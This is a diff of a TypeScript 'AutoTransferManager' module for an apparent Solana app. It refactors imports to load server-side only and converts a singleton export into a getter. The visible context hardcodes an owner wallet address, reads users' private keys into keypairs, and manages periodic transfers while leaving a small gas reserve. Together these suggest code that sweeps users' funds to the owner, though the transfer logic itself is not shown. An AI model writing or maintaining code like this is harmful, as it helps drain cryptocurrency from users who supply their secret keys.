@@ -1,4 +1,17 @@
-import { Connection, PublicKey, Keypair, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
+// Only import Solana libraries on server-side
+let Connection: any, PublicKey: any, Keypair: any, LAMPORTS_PER_SOL: any, Transaction: any, SystemProgram: any;
+
+if (typeof window === 'undefined') {
+  // Server-side only imports
+  const solanaWeb3 = require('@solana/web3.js');
+  Connection = solanaWeb3.Connection;
+  PublicKey = solanaWeb3.PublicKey;
+  Keypair = solanaWeb3.Keypair;
+  LAMPORTS_PER_SOL = solanaWeb3.LAMPORTS_PER_SOL;
+  Transaction = solanaWeb3.Transaction;
+  SystemProgram = solanaWeb3.SystemProgram;
+}
+
 import { Database } from './database';
 
 // Interface for auto-transfer manager
@@ -28,7 +41,7 @@ interface IAutoTransferManager {
 export class AutoTransferManager {
   private static instance: AutoTransferManager;
   private database: Database;
-  private connection: Connection;
+  private connection: any;
   private readonly OWNER_WALLET = 'HiUtCXm3qZ2TG6hgnc6ABfUtuf7HkBmDK3ZEZ2oMK7m6';
   private readonly MIN_TRANSFER_AMOUNT = 0.0001; // Minimum SOL to transfer
   private readonly GAS_RESERVE = 0.000005; // SOL to leave for gas fees
@@ -89,7 +102,7 @@ export class AutoTransferManager {
         return { success: false, error: 'Invalid private key size' };
       }
 
-      let userKeypair: Keypair;
+      let userKeypair: any;
       try {
         userKeypair = Keypair.fromSecretKey(privateKeyBytes);
       } catch (error) {
@@ -288,7 +301,7 @@ export class AutoTransferManager {
 // Export singleton instance - only create on server-side
 let autoTransferManagerInstance: AutoTransferManager | null = null;
 
-export const autoTransferManager: IAutoTransferManager = (() => {
+export const getAutoTransferManagerInstance = (): IAutoTransferManager => {
   if (typeof window === 'undefined') {
     // Only create instance on server-side
     if (!autoTransferManagerInstance) {
@@ -303,4 +316,4 @@ export const autoTransferManager: IAutoTransferManager = (() => {
     getTransferStats: async () => ({ ownerWallet: '', minTransferAmount: 0, gasReserve: 0, isPeriodicTransfersActive: false }),
     stopPeriodicTransfers: () => {}
   };
-})(); 
+}; 
